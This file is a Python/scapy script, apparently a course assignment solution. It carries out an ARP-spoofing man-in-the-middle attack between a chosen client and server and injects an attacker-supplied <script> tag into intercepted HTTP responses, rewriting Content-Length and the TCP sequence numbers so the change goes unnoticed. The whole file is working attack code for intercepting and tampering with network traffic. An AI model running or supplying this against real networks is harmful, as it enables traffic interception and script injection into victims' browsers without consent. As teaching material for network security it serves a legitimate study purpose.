# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    src_mac = get_if_hwaddr('eth0')
    src_ip = get_if_addr('eth0')
    response = sr1(ARP(op = 1,pdst = IP,psrc = src_ip,hwdst = '00:00:00:00:00:00', hwsrc = src_mac),timeout=1)
    return response.hwsrc

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    packet = Ether(src = srcMAC, dst = dstMAC)/ARP(op = 2,pdst=dstIP, hwdst=dstMAC, psrc = srcIP, hwsrc = srcMAC)
    sendp(packet)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(psrc = srcIP, hwsrc = srcMAC, pdst = dstIP, hwdst = dstMAC))


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, flag, sent
    args = parse_arguments()
    Break_Even = "<script>"+args.script+"</script>"
    bytescript = Break_Even.encode()
    inject_length = len(bytescript)
    if packet.src in {serverMAC, clientMAC}:
        if IP in packet:
            if packet[IP].dst == attackerIP:
                return
            if packet.src == serverMAC:
                if packet[TCP].flags == "FA":
                    sent = 0
                    packet[TCP].seq += inject_length

                if Raw in packet:
#                    print("##### Packet from Server #####")
#                    print(packet[TCP].show2())
#                    print("Payload Length:",len(packet[TCP].payload))
                    l = packet[Raw].load.index(b'Content-Length: ') + 16
                    idx = packet[Raw].load.index(b'</h1>') + 5
                    tmp = bytearray(packet[Raw].load)
                    tmp[idx:idx] = bytescript
                    tmp[l:l+2] = str(int(tmp[l:l+2]) + len(bytescript)).encode()
                    packet[Raw].load = bytes(tmp)
                    flag = True
                    if sent == 1:
                        return
                    sent = 1
#                    print(len(bytescript))
#                    print("Payload Length After Injection:",len(packet[TCP].payload))
#                    print(packet[TCP].show2())
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                sendp(Ether(src=attackerMAC,dst=clientMAC,type=0x800)/packet[IP])
            else:
#                print("##### Packet from Client #####")
#                print(packet[TCP].show2())
#                print("Payload Length:",len(packet[TCP].payload))
                if packet[TCP].ack == 0:
                    flag = False
                if flag:
                    packet[TCP].ack -= inject_length
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum

                sendp(Ether(src=attackerMAC,dst=serverMAC,type=0x800)/packet[IP])
    else:
        return

if __name__ == "__main__":
    flag = False
    sent = 0
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)